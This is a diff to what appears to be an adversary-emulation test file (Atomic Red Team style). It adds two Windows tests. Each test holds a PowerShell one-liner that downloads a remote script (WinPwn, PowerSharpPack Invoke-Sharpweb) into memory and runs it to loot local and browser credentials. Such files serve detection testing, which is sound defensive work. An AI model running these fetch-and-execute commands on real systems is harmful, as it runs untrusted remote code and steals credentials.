@@ -179,3 +179,22 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       samfile -consoleoutput -noninteractive  
     name: powershell
+- name: WinPwn - Loot local Credentials - mimi-kittenz
+  description: Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      kittenz -consoleoutput -noninteractive
+    name: powershell
+- name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials 
+  description: PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+      Invoke-Sharpweb -command "all"
+    name: powershell
